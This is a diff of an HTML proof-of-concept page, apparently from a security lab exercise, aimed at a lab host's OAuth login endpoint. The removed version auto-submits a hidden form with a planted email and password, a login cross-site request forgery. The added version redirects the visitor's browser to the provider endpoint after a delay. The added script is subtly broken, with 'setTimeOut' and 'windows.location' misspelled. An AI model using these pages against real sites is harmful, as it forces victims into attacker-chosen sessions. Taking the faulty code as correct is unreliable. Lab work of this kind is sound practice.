@@ -1,13 +1,10 @@
 <html>  
 <body>  
-<form action="http://ptl-0a9f65ee-9749d9fe.libcurl.so/users/auth/myprovider" method="GET">
-<input type="hidden" name="commit" value="Log in" />
-<input type="hidden" name="user[remember_me]" value="0" />
-<input type="hidden" name="user[password]" value="aaaaaa" />
-<input type="hidden" name="user[email]" value="aadmin@libcurl.so" />
+<form action="iframe.html">
 </form>  
-<script>  
-document.forms[0].submit();  
+  
+<script>
+  setTimeOut(function() {windows.location="http://ptl-0a9f65ee-9749d9fe.libcurl.so/users/auth/myprovider"}, 500);
 </script>  
 </body>  
 </html>
